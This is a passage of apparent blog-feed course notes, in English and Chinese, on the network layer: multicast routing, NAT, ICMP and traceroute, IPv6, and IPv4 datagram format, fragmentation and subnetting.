minimum cost tree connecting all  routers with attached group members  problem is NP-complete</li><li>excellent heuristics exists  not used in practice:<ul><li>computational complexity</li><li>information about entire network needed</li><li>monolithic: rerun whenever a router needs to join/leave</li></ul></li></ul></li><li><p>Center-based trees</p><ul><li>single delivery tree shared by all</li><li>one router identified as “center” of tree</li><li>to join:<ul><li>edge router sends unicast join-msg addressed to center router</li><li>join-msg  “processed” by intermediate routers and forwarded  towards center</li><li>join-msg either hits existing tree branch for this center, or arrives  at center</li><li>path taken by join-msg becomes new branch of tree for this router</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.47.jpg" class=""></li><li><p>Internet Multicasting  Routing: DVMRP</p><ul><li>DVMRP: distance vector multicast routing protocol,  RFC1075</li><li>flood and prune: reverse path forwarding, source-based  tree<ul><li>RPF tree based on DVMRP’s own routing tables constructed by  communicating DVMRP routers</li><li>no assumptions about underlying unicast</li><li>initial datagram to mcast group flooded everywhere via RPF</li><li>routers not wanting group: send upstream prune msgs</li></ul></li><li>soft state: DVMRP router periodically (1 min.)  “forgets” branches are pruned:<ul><li>mcast data again flows down unpruned branch</li><li>downstream router: reprune or else continue to receive data</li></ul></li><li>routers can quickly regraft to tree<ul><li>following IGMP join at leaf</li></ul></li><li>odds and ends<ul><li>commonly implemented in commercial router</li></ul></li></ul></li><li><p>Tunneling</p><ul><li><p>how to connect “islands” of multicast routers in a “sea” of unicast routers?</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.48.jpg" class=""></li><li><p>mcast datagram encapsulated inside “normal” (non-multicast-addressed) datagram</p></li><li><p>normal IP datagram sent thru “tunnel” via regular IP  unicast to receiving mcast router (recall IPv6 inside  IPv4 tunneling)</p></li><li><p>receiving mcast router unencapsulates to get mcast datagram</p></li></ul></li><li><p>PIM: Protocol  Independent Multicast</p><ul><li>not dependent on any specific underlying  unicast routing algorithm (works with all)</li><li>two different multicast distribution scenarios<ul><li>dense(密集):<ul><li>group members  densely packed, in  “close” proximity</li><li>bandwidth more  plentiful</li></ul></li><li>sparse(稀疏):<ul><li>#networks with group  members small wrt # interconnected networks</li><li>group members “widely  dispersed”</li><li>bandwidth not plentiful</li></ul></li></ul></li></ul></li><li><p>Consequences of sparsedense dichotomy:</p><ul><li>dense<ul><li>group membership by  routers assumed until  routers explicitly prune</li><li>data-driven construction  on mcast tree (e.g., RPF)</li><li>bandwidth and non-group-router processing  profligat</li></ul></li><li>sparse:<ul><li>no membership until  routers explicitly join</li><li>receiver- driven construction of mcast tree (e.g., center-based)</li><li>bandwidth and non-grouprouter processing  conservative</li></ul></li></ul></li><li><p>PIM- dense mode</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.49.jpg" class=""><ul><li>flood-and-prune RPF: similar to DVMRP  but…<ul><li>underlying unicast protocol provides RPF  info for incoming datagram</li><li>less complicated (less efficient)  downstream flood than DVMRP reduces  reliance on underlying routing algorithm</li><li>has protocol mechanism for router to  detect it is a leaf-node router</li></ul></li><li>center-based approach</li><li>router sends join msg to  rendezvous point (RP)<ul><li>intermediate routers  update state and forward  join</li></ul></li><li>after joining via RP, router  can switch to source-specific tree<ul><li>increased performance:  less concentration,  shorter paths</li></ul></li><li>sender(s):<ul><li>unicast data to RP, which  distributes down RP</li><li>rooted tree  RP can extend mcast tree upstream to source</li><li>RP can send stop msg if  no attached receivers<ul><li>“no one is listening!”</li></ul></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-网络层（三）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/</url>
    
    <content type="html"><![CDATA[<p>3、<strong>Network Address Translation (NAT，网络地址转换)</strong></p><ul><li><p>A <strong>realm(地域)</strong> with private addresses refers to a network whose addresses only have meaning to devices within that network</p></li><li><p>motivation: local network uses just one IP address as far as  outside world is concerned:</p><ul><li>range of addresses <strong>not needed</strong> from ISP: <strong>just one IP  address</strong> for all devices</li><li>can <strong>change addresses of devices</strong> in local network without  notifying outside world</li><li><strong>can change ISP</strong> without changing addresses of devices in  local network</li><li>devices inside local net <strong>not explicitly addressable</strong>, <strong>visible</strong>  by outside world (a <strong>security plus</strong>)</li></ul></li><li><p>implementation: NAT router must:</p><ol><li><p><strong>outgoing datagrams: replace</strong> (source IP address, port #)  of every outgoing datagram to (<strong>NAT IP address, new  port #</strong>) . . .</p><p>remote clients/servers will respond using (<strong>NAT IP  address, new port #</strong>) as destination addr</p></li><li><p><strong>remember (in NAT translation table)</strong> every (source IP  address, port #) to (NAT IP address, <strong>new port #</strong>)  <strong>translation pair</strong></p></li><li><p><strong>incoming datagrams: replace (NAT IP address, new port  #)</strong> in dest fields of every incoming datagram with  corresponding (<strong>source IP address, port #</strong>) stored in NAT  table</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.26.jpg" class=""></li></ol><ul><li>the router gets its address from the ISP’s DHCP server, and <strong>the router runs a DHCP server</strong> to provide addresses to computers within the NAT-DHCP-router-controlled home network’s address space，为位于NAT-DHCP 路由器控制的家庭网络地址空间中的计算机提供地址</li><li>how does the router know the internal host to which it should forward a given datagram? ==&gt; use a <strong>NAT translation table(转发表)</strong> at the NAT router</li><li>because a port number field is <u>16 bits</u> long, the NAT protocol can support over <u>60,000</u> simultaneous(同时发生的) connections with a single WAN-side IP address for the router</li></ul></li><li><p>What is the maximum number of supported connections for a  single LAN-side address?</p><ul><li>a connection is identified by 5-tuple: (1) protocol, (2) source IP  address, (3) source port number, (4) dest IP address, (5) dest port  number</li><li>协议× 源地址×源端口×目的地址×目的端口 = 2 × 1 × 2^16^ × 2^32^ × 2^16^ =  2^65^</li></ul></li><li><p>NAT is controversial (争议):</p></li></ul><ol><li><strong>port numbers</strong> should be used for <strong>addressing processes</strong>, not for <strong>addressing hosts</strong><ul><li>e.g. servers running on the home network want to use well-known  ports numbers (出口端口可能变为非知名端口)</li></ul></li><li>routers <strong>should only</strong> process up to <strong>layer 3</strong> (should not  transport layer,即不应修改端口号)</li><li><strong>violates end-to-end argument</strong> (违背端到端观点)<ul><li>hosts should be talking directly with each other without  interfering</li><li>NAT possibility must be taken into account by app designers, e.g.,  P2P applications</li></ul></li><li>address shortage should instead be solved by IPv6 not  patching(通过IPv6解决地址耗尽问题而不是打补丁)</li></ol><ul><li><p>NAT <strong>traversal (穿越)</strong>  problem</p><ul><li><p>NAT traversal is increasingly provided by Universal Plug and Play (UPnP), which is a protocol that allows a host to discover and configure a nearby NAT</p></li><li><p>With UPnP,an application running in a host can request a NAT mapping between its (<em>private IP address, private port number</em>) and the(<em>public IP address,public port number</em>) for some requested public port number</p></li><li><p>client wants to connect to  server with address 10.0.0.1</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.25.jpg" class=""><ul><li>server address 10.0.0.1 local  to LAN (client can’t use it as  destination addr)</li><li>only one externally visible  NATed address: 138.76.29.7</li></ul></li><li><p>solution1: statically configure  NAT to forward incoming  connection requests at given  port to server</p><ul><li>e.g., (138.76.29.7, port 2500)  always forwarded to 10.0.0.1  port 80</li></ul></li><li><p>solution 2: <strong>Universal Plug and Play (UPnP, 通用即插即用) Protocol</strong>.  Allows NATed host to:</p><img src="%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823.assets/4.26-16529381772011.jpg" alt="4.26" style="zoom:50%;" /><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.26-16529381772011.jpg" class=""><ul><li>discover and configure nearby  NAT device</li><li>add/remove port mappings  (with lease times)</li><li>learn public IP address  (138.76.29.7)</li><li>i.e., automate static NAT port  map configuration</li></ul></li><li><p>solution 3: relaying (中继) (used in Skype)</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.27.jpg" class=""><ul><li>NATed client establishes connection to relay</li><li>external client connects to relay</li><li>relay bridges packets between to connections</li></ul></li></ul></li></ul><h3 id="4-4-3-Internet-Control-Message-Protocol-ICMP，因特网控制报文协议">4.4.3 Internet Control Message Protocol (ICMP，因特网控制报文协议)</h3><p>Recall：</p><p>the Internet has three main components：</p><p>:one:<strong>IP protocol</strong></p><p>:two:the Internet <strong>routing protocols</strong> (including RIP.OSPF,and BGP)</p><p>:three:<strong>ICMP</strong></p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.28.jpg" class=""><ul><li><p>ICMP is used by <strong>hosts</strong> and <strong>routers</strong> to <strong>communicate network-layer information</strong> to each other. The most typical use of ICMP is for <strong>error reporting(差错报告)</strong></p><ul><li><p>(1) error reporting: unreachable host, network, port,  protocol</p></li><li><p>(2) echo request/reply (used by ping)</p></li><li><p>For example</p><ul><li>error message such as&quot;Destination network unreachable.&quot;(网络不可达)==&gt;This message had its origins in ICMP ==&gt;an IP router was unable to find a path to the host ==&gt;That <strong>router</strong> created and sent a <strong>type-3 ICMP message</strong> to your host indicating the error</li></ul></li></ul></li><li><p>ICMP is often considered part of IP but architecturally it lies just <strong>above IP</strong>, as ICMP messages are <strong>carried inside IP datagrams</strong>, just as TCP or UDP segments <strong>are carried as IP payload</strong></p><ul><li>when a host receives an IP datagram with ICMP specified as the upper-laver protocol, it demultiplexes the datagram’s contents to ICMP, just as it would demultiplex a datagram’s content to TCP or UDP</li></ul></li><li><p>ICMP messages have a <strong>type and a code field</strong>(类型字段，编码字段),and <strong>contain the header</strong> and the <strong>first 8 bytes of the IP datagram</strong> that <u>caused the ICMP message to be generated in the first place</u>，(引起该ICMP包首次产生的 datagram头部和前8字节内容)</p><p>==&gt;so that the sender can determine the datagram that caused the error</p></li></ul><table><thead><tr><th>ICMP Type</th><th>Code</th><th>Description</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>echo reply (ping)</td></tr><tr><td>3</td><td>0</td><td>dest. network unreachable</td></tr><tr><td>3</td><td>1</td><td>dest host unreachable</td></tr><tr><td>3</td><td>2</td><td>dest protocol unreachable</td></tr><tr><td>3</td><td>3</td><td>dest port unreachable</td></tr><tr><td>3</td><td>6</td><td>dest network unknown</td></tr><tr><td>3</td><td>7</td><td>dest host unknown</td></tr><tr><td>4</td><td>0</td><td>source quench (congestion control - not used)</td></tr><tr><td>8</td><td>0</td><td>echo request (ping)</td></tr><tr><td>9</td><td>0</td><td>route advertisement</td></tr><tr><td>10</td><td>0</td><td>router discovery</td></tr><tr><td>11</td><td>0</td><td>TTL expired</td></tr><tr><td>12</td><td>0</td><td>bad IP header</td></tr></tbody></table><ul><li><p>ping program</p><ul><li>sends an ICMP <strong>type 8</strong> <strong>code 0</strong> message to the specified host</li><li>The <u>destination host</u>, seeing the <strong>echo request</strong>, sends back a <strong>type 0 code 0</strong> <u>ICMP echo reply</u></li></ul><p>（Most TCP/IP implementations support the ping server directly in the operating system; that is, the server <u>is not a process</u>）</p></li><li><p>ICMP message is the <strong>source quench</strong>(源抑制) message</p><ul><li>seldom used in practice</li><li>allow a congested router to send an ICMP source quench message to a host to force that host to reduce its transmission rate</li><li>TCP has its own congestion-control mechanism==&gt;ICMP source quench message is out of use</li></ul></li><li><p>Traceroute and ICMP</p><ul><li><p>Traceroute is <u>implemented</u> with ICMP messages</p></li><li><p>To determine the names and addresses of the routers between source and destination</p><ul><li>Traceroute in the source sends a series of ordinary IP datagrams to the destination, 一系列普通的IP数据报</li><li>Each of these datagrams carries a UDP segment with an u<strong>nlikely UDP port number</strong>，不可达</li><li>the first of these datagrams has a TTL of 1,the second of 2,the third of 3,and so on</li></ul></li><li><p>the source starts <strong>timers</strong> for <u>each</u> of the datagrams</p><ul><li>when the nth datagram arrives at the nth router, the nth router observes that the TTL of the datagram has just expired, n到n刚好过期</li></ul></li><li><p>According to the rules of the IP protocol, the router <strong>discards</strong> the datagram and <strong>sends an ICMP</strong> <u>warning</u> message to the source(<strong>type 11 code 0</strong>)</p><p>=&gt;this ICMP message arrives back at the source</p><p>=&gt;This warning message includes <strong>the name of the router</strong> and <strong>its IP address</strong></p></li><li><p>when ICMP messages  arrives, source <strong>records  round-trip time</strong></p></li><li><p>stopping criteria (条件)</p><ul><li>UDP segment eventually  arrives at <u>destination host</u></li><li>destination returns ICMP  “port unreachable” message  (<strong>type 3, code 3: dest port  unreachable</strong>)</li><li>source stops</li></ul></li><li><p>Note: The standard Traceroute program actually sends sets of <strong>three packets</strong> with <strong>the same TTL</strong>; thus the Traceroute output provides three results for each TTL</p></li></ul></li></ul><h3 id="4-4-4-IPv6">4.4.4 IPv6</h3><ul><li>February 2011, IANA(ICANN下属机构) allocated out the  last remaining pool of unassigned IPv4 address</li><li>initial motivation: 32-bit address space soon to be  completely allocated. [Bradner 1996, RFC 1752]</li><li>additional motivation:<ul><li>header format helps speed processing/forwarding</li><li>header changes to facilitate QoS 提升服务质量</li></ul></li></ul><h6 id="1、IPv6-Datagram-Format">1、IPv6 Datagram Format</h6><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.29.jpg" class=""><ul><li><p>Expanded addressing capabilities</p><ul><li>IPv6 increases the size of the IP address from 32 to <strong>128 bits</strong></li><li>In addition to <strong>unicast</strong>(单播) and <strong>multicast</strong>(多播) addresses. IPv6 has introduced a new type of address, called an <strong>anycast address(任播地址)</strong><ul><li>allows a datagram to be delivered to <u>any one of a group of hosts</u></li><li>This feature could be used,for example, to send an HTTP GET to the nearest of a number of mirror sites that contain a given document，向一组包含给定文档的镜像站点中的最近的一个发送一个HTTP GET报文</li></ul></li></ul></li><li><p>A streamlined 40-byte header</p><ul><li>fixed-length header</li><li>allows for faster processing of the IP datagram</li><li>A new encoding of options allows for more flexible options processing</li></ul></li><li><p>Flow labeling and priority，流标签和优先级</p><ul><li>identify datagrams in same “flow.” the exact meaning of a flow has not yet been determined</li></ul></li><li><p>traffic class(priority)</p><ul><li>identify priority among datagrams in flow</li><li>8-bit</li><li>similar in  spirit to the TOS in IPv4</li></ul></li><li><p>Payload length</p><ul><li>16-bit</li><li>gives the number of bytes in the IPv6 datagram following the fixed-length,40-byte datagram header</li></ul></li><li><p>Next header</p><ul><li>this field identifies the protocol to which the contents(data field) of this datagram will be delivered<ul><li>for example, to TCP or UDP</li></ul></li><li>The field uses the same values as the protocol field in the IPv4 header</li></ul></li><li><p>Hop limit</p><ul><li>decremented by one by each router that forwards the datagram==&gt;-1</li><li>reaches zero==&gt;the datagram is discarded</li><li>similar the  TTL in IPv4</li></ul></li><li><p>Source and destination addresses: 128 bits</p></li><li><p>Data</p><ul><li>the <strong>payload</strong> portion of the IPv6 datagram</li><li>When the datagram reaches its <u>destination</u>, the payload will be removed from the IP datagram and passed on to the protocol [<u>specified in the next header field</u>]</li></ul></li><li><p>several fields appearing in the IPv4 datagram are no longer present in the IPv6 datagram:</p><ul><li>Fragmentation/Reassembly<ul><li>IPv6 does <strong>not allow</strong> for fragmentation and reassembly at <strong>intermediate routers</strong></li><li>can be performed only by the <strong>source and destination</strong></li><li>(for router)If  too large to be forwarded over the outgoing link ==&gt; <strong>drops</strong>、sends a &quot;Packet Too Big&quot;<strong>ICMP error message</strong> back to the sender<ul><li>ICMP v6: new version of ICMP  additional message types, e.g.  “Packet Too Big”</li><li>multicast group management functions (IGMP, Sec. 4.7)</li></ul></li><li>The sender resend the data,using a <strong>smaller</strong> IP datagram size</li><li>Fragmentation and reassembly is a <strong>time-consuming operation</strong>，removing this functionality from the routers and placing it squarely(直接地，干脆地) in the <strong>end systems</strong> considerably <strong>speeds up</strong> IP forwarding within the network</li></ul></li><li>Header checksum<ul><li>the <strong>transport-layer</strong>(for example, <u>TCP and UDP</u>)and data <strong>link-layer</strong>(for example, <u>Ethernet</u>) protocols in the Internet layers perform checksumming</li></ul></li><li>Options<ul><li>allowed, but outside of header(不再首部中出现),  indicated by “Next Header” field</li><li>The removal of the options field results in a <strong>fixed-length</strong>, <strong>40-byte</strong> IP header</li></ul></li></ul></li><li><p>Note</p><ul><li>IPv6 datagram format:<ul><li>fixed-length 40 byte header (recall: IPv4 header is 20 bytes  typical) (注意：IPv6头部长度固定，IPv4不是)</li><li>IPv6 IP address length is 128 bits (recall: IPv4 address is 32  bits)</li><li>no fragmentation allowed (不进行分片)</li><li>a number of IPv4 fields are dropped or made optional (fast  process)</li></ul></li></ul></li></ul><h6 id="2、Transitioning-from-IPv4-to-IPv6">2、Transitioning from IPv4 to IPv6</h6><ul><li><p>Two approaches for transitioning from IPv4 to IPv6: <strong>dual-stack(双栈)</strong> and <strong>tunneling (隧道)</strong></p></li><li><p>dual-stack(双栈)</p><ul><li>IPv6/IPv4 node：<ul><li>has the ability to send and receive <strong>both Pv4 and IPv6 datagrams</strong></li><li>must have both IPv6 and IPv4 addresses</li></ul></li><li>whether another node is IPv6-capable or IPv4-only==&gt;DNS</li><li>the data field of the IPv6 datagram can be copied into the data field of the IPv4 datagram and appropriate <strong>address mapping</strong> can be done,适当的地址映射</li><li>from IPv6 to IPv4, some information in these fields will be loss</li><li>if either the sender or the receiver is only IPv4-capable ( 只支持IPv4), IPv4 datagram must be used</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.1.jpg" class=""></li><li><p>tunneling</p><ul><li><p>the intervening set of IPv4 routers between two IPv6 routers as a tunnel</p></li><li><p>IPv6 datagram carried as payload in IPv4  datagram among IPv4 routers</p></li><li><p>intervening IPv4 routers <strong>unaware</strong> that the IPv4 datagram itself contains a <strong>complete IPv6 datagram</strong></p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%823/4.3.jpg" class=""></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-网络层（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/</url>
    
    <content type="html"><![CDATA[<h1>4.4 The Internet Protocol (IP): Forwarding and Addressing in the Internet，网际协议∶因特网中的转发和编址</h1><ul><li>the Internet’s network layer has three major components<ul><li><strong>the IP protocol</strong></li><li><strong>the routing component</strong><ul><li><strong>determines the path</strong> a datagram follows from source to destination</li></ul></li><li>a facility(设施) to <strong>report errors</strong> in datagrams and <strong>respond to requests</strong> for <u>certain network-layer information</u></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.12.jpg" class=""><h3 id="4-4-1-Datagram-Format">4.4.1 Datagram Format</h3><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.13.jpg" class=""><ul><li><p>Version number</p><ul><li>By looking at the version number, the router can determine how to interpret the remainder of the IP datagram</li></ul></li><li><p>Header length</p><ul><li>an IPv4 datagram can contain a <u>variable</u> number of <u>options</u> (which are included in the IPv4 datagram header)</li><li>4 bits</li><li>determine where in the IP datagram the <strong>data</strong> actually begins</li><li>Most IP datagrams <u>do not contain options</u>, so the <strong>typical</strong> IP datagram has a <strong>20-byte</strong> header</li></ul></li><li><p><strong>Type of service（TOS）</strong></p><ul><li>allow <u>different types of IP datagrams</u> (for example, datagrams particularly requiring <u>low delay</u>, <u>high throughput</u>, or <u>reliability</u>) to be <strong>distinguished</strong> from each other<ul><li>it might be useful to distinguish <u>real-time datagrams</u> (such as those used by an IP telephony application) from <u>non-real-time traffic</u>(for example, FTP)</li></ul></li></ul></li><li><p>Datagram length</p><ul><li>the <strong>total length</strong> of the IP datagram(<strong>header plus data</strong>)</li><li>this field is <strong>16 bits</strong> long==&gt;the theoretical <strong>maximum size</strong> of the IP datagram is <strong>65,535 bytes</strong></li><li>datagrams are <u>rarely</u> larger than <strong>1,500 bytes</strong></li></ul></li><li><p>Identifier, flags, fragmentation offset，标识，标志，分片偏移量</p><ul><li>to do with so-called IP fragmentation/reassembly，分片和重组</li><li><strong>only</strong> for IPv4</li></ul></li><li><p><strong>Time-to-live(TTL，寿命)</strong></p><ul><li>ensure that datagrams <strong>do not circulate forever</strong>(due to, for example, a long-lived routing loop)in the network</li><li>This field is decremented by one each time the datagram is processed by <strong>a router</strong></li><li>If the TTL field reaches 0 , the datagram must be <strong>dropped</strong></li></ul></li><li><p>Potocol</p><ul><li>be used only when an IP datagram reaches its <strong>final destination</strong></li><li>indicates the specific <strong>transport-layer</strong> protocol to which the data portion of this IP datagram should be passed<ul><li>6：TCP；17：UDP</li></ul></li><li>note<ul><li>the <strong>protocol number</strong> is the glue that binds the <strong>network and transport layers</strong> together</li><li>the <strong>port numbe</strong>r is the glue that binds the <strong>transport and application layers</strong> together</li></ul></li></ul></li><li><p>Header checksum</p><ul><li>aids a router in detecting bit errors in a received IP datagram</li><li>treating each <strong>2 bytes</strong> in the <strong>header</strong> as a number and summing these numbers using <u>1s complement arithmetic</u></li><li>A router computes the header checksum for <u>each</u> received IP datagram</li><li>Routers typically <strong>discard</strong> datagrams for which an error has been detected(检测到的)</li><li>Note that the checksum must be recomputed and stored <u>again</u> at each router,as the <strong>TTL</strong> field, and possibly the <strong>options field</strong> as well, may <strong>change</strong></li><li>Why does TCP/IP perform error checking at both the  transport and network layers?<ul><li>only the <strong>IP header</strong> is checksummed at the IP layer, <strong>entire TCP/UDP segment</strong> checksum at TCP/UDP (IP层的校验和只针对IP头部进行校验，Segment数据在传输层进行校验)</li><li>TCP/UDP and IP do not necessarily both have to belong to  the same protocol stack. TCP can run over a different  protocol (for example, ATM) and IP can carry data that  will not be passed to TCP/UDP (IP和TCP/UDP可能属于不同的协议栈)</li></ul></li></ul></li><li><p>Data(payload)</p><ul><li>In most circumstances, the data field of the IP datagram contains the <strong>transport-layer segment(TCP or UDP)</strong> to be delivered to the destination</li><li>the data field can carry <strong>other types of data</strong>, such as <strong>ICMP messages</strong></li></ul></li><li><p>Note</p><ul><li>an IP datagram has a total of <strong>20 bytes</strong> of header(assuming no options)</li><li>If the datagram carries a TCP segment, then each (nonfragmented) datagram carries a total of <strong>40 bytes</strong> of header (20 bytes of IP header plus 20 bytes of TCP header) along with the <strong>application-layer message</strong></li></ul></li><li><p>Comparison: Length field</p><ul><li>UDP protocol<ul><li>头部字段固定为8个字节</li><li>Length field (16 bits): the number of bytes in the UDP segment  (header plus data)</li></ul></li><li>TCP protocol<ul><li>头部字段典型长度为20个字节 (当option字段为空时)</li><li>Header length field (4 bits): the length of the TCP header  including option field, measured in 32-bit words (以4个字节为基本单位)</li></ul></li><li>IP protocol (IPv4)<ul><li>头部字段典型长度为20个字节 (当option字段为空时)</li><li>Header length field (4bits): the length of the header including  option field</li><li>Datagram Length field (16 bits): the total length of the IP  datagram (header plus data), measured in bytes (以1个字节为基本单位)</li></ul></li></ul></li></ul><h6 id="IP-Datagram-Fragmentation">IP Datagram Fragmentation</h6><ul><li><p>not all <u>link-layer protocols</u> can carry <u>network-layer packets</u> of the <u>same size</u></p><ul><li><strong>Ethernet frames</strong> can carry up to <strong>1,500 bytes</strong> of data</li><li>the <strong>maximum transmission unit (MTU，最大传输单元)</strong>：The maximum amount of data that a link-layer frame can carry is called</li><li>回顾：MSS: (maximum segment size 最大报文段长度) ，定义 ：传输层能承载的应用层最大数据长度，不包括传输层的头部 （注意：它并非指报文段(segment)的长度！！！）<ul><li>例如：一个在以太网上传输的IPv4 TCP报文的MSS值为1460， 是由MTU=1500bytes减去IPv4 Header（20 Byte）和TCP  header（20 Byte）得到</li></ul></li></ul></li><li><p>each IP datagram is encapsulated within the link-layer frame for transport from one router to the next router==&gt;the MTU of the link-layer protocol places a hard <strong>limit</strong> on the length of an IP datagram</p></li><li><p>What is a problem is that each of the links along the route between sender and destination can use <u>different link-layer protocols</u>, and each of these protocols can have <u>different MTUs</u></p></li><li><p>fragmentation:</p><ul><li>in: one large  datagram</li><li>out: 3 smaller  datagrams==&gt;fragment(片)</li></ul></li><li><p>Fragments need to be <strong>reassembled</strong> before they reach the <strong>transport layer</strong> at the <strong>destination</strong></p><ul><li>Sticking to the principle of <strong>keeping the network core simple</strong>, the designers of IPv4 decided to put the job of <strong>datagram reassembly</strong> in the <strong>end systems</strong> rather than in network routers</li></ul></li><li><p>When a destination host receives a series of datagrams from the same source, it needs to determine whether any of these datagrams are fragments of some original, larger datagram</p><p>==&gt; the designers of IP(version 4)put identification, flag, and fragmentation offset fields in the IP datagram header</p><p>Typically,the sending host increments the identification number for each datagram it sends，标识号+1</p></li><li><p>IP is an unreliable service–&gt;sure it has received the last fragment of the original datagram</p><p>==&gt; one or more of the fragments may never arrive at the destination</p><p>==&gt;the last fragment has a flag bit set to 0, all the other fragments have this flag bit set to 1</p><p>in order for the destination host to determine whether a fragment is missing(and also to be able to reassemble the fragments in their proper order)</p><p>==&gt;the <strong>offset field</strong> is used to specify(详细说明，指定) where the fragment fits within the <u>original IP datagram</u></p></li><li><p>例</p><ul><li><p>A datagram of <u>4,000 bytes</u> (20 bytes of IP header plus 3,980 bytes of IP payload) arrives at a router and must be forwarded to a link with an <u>MTU of 1,500 bytes</u></p><p>==&gt;implies that the 3,980 data bytes in the original datagram must be allocated to three separate fragments(each of which is also an IP datagram)</p></li><li><p>suppose that the <u>original datagram</u> is stamped with an identification number of <u>777</u>，标识号为777</p></li><li><img src="%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822.assets/4%E3%80%8214.jpg" alt="4。14" style="zoom:67%;" /></li><li><table><thead><tr><th>Format</th><th>Bytes</th><th>ID</th><th>Offset</th><th>Flog</th></tr></thead><tbody><tr><td>1st  format</td><td>1480 bytes in the data field of the IP datagram</td><td>identification=777</td><td>offset=0<br />(meaning the data should be inserted begining at byte 0)</td><td>flag=1<br />(meaning there is more)</td></tr><tr><td>2nd  format</td><td>1480 bytes of data</td><td>identification=777</td><td>offset=185<br />(meaning the data should be inserted begining at byte 1480. Note that 185×8=1480)</td><td>flag=1<br />(meaning there is more)</td></tr><tr><td>3rd  format</td><td>1020 bytes of data（3980-1480-1480）</td><td>identification=777</td><td>offset=370<br />(meaning the data should be inserted begining at byte 2960. Note that 370×8=2960)</td><td>flag=0<br />(meaning this is the last format)</td></tr></tbody></table><p><img src="%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822.assets/4.14.jpg" alt="4.14"></p></li></ul></li><li><p>At the <strong>destination</strong>, the payload of the datagram is passed to the transport layer <strong>only after</strong> the IP layer has <strong>fully reconstructed the original IP datagram</strong></p><ul><li>If one or more of the fragments does not arrive at the destination, the <strong>incomplete</strong> datagram is <strong>discarded</strong> and not passed to the transport layer</li><li>if TCP is being used at the transport layer, then TCP will recover from this loss by having the source retransmit the data in the original datagram</li></ul></li><li><p>drawback</p><ul><li>complicates routers and end system</li><li>fragmentation can be used to create lethal(致命的) DoS attacks</li></ul></li></ul><h3 id="4-4-2-IPv4-Addressing，IPv4编址">4.4.2 IPv4 Addressing，IPv4编址</h3><ul><li><p>A host typically has only <strong>a single link</strong> into the network</p></li><li><p><strong>interface</strong>：The <u>boundary</u> between the <u>host</u> and the <u>physical link</u></p><ul><li>router’s typically have  multiple interfaces</li><li>host typically has one or  two interfaces (e.g.,  wired Ethernet, wireless  802.11)</li></ul></li><li><p>IP requires <u>each host and router interface</u> to have its <strong>own IP address</strong></p></li><li><p><strong>an IP address</strong> is technically <strong>associated with an interface</strong>, rather than with the host or router containing that interface</p></li><li><p>Each IP address is <strong>32 bits</strong> long (equivalently, <strong>4 bytes</strong>), and there are thus a total of <strong>2^32^ possible IP addresses</strong>(约有40亿个可能的IP地址)</p><ul><li><strong>dotted-decimal notation(点分十进制)</strong></li><li>A portion of an interface’s IP address will be determined by the subnet(子网) to which it is connected</li></ul></li><li><p>Subnets (子网)</p><ul><li><p>what’s a subnet ?</p><ul><li>device interfaces with  same subnet part(子网位) of IP address</li><li>can physically reach each  other without intervening  router</li></ul></li><li><p>to determine the subnets,  detach(分离) each interface  from its host or router,  creating islands of isolated  networks</p></li><li><p>each isolated network is called a subnet</p></li><li><p>subnet:223.1.1.0/24：</p><ul><li><p>/24 notations is subnet mask( 子网掩码)</p><p>11111111 11111111  11111111 00000000 =  255.255.255.0</p></li><li><p>subnet network address(子网网络地址)：223.1.1.0 (计算方式 ：IP address AND subnet  mask)</p></li></ul></li></ul></li><li><p>已知一个IP地址和子网掩码可以算出：</p><p>（1）子网的网络地址(network address)</p><p>（2）子网的广播地址(broadcast address)</p><p>（3）子网中的主机地址范围</p><p>（4）子网中有几台主机</p><ul><li><p>Note:</p><p>When a host sends a datagram with <strong>destination  address (broadcast address)</strong>, the message is <u>delivered</u> to <strong>all hosts on the same 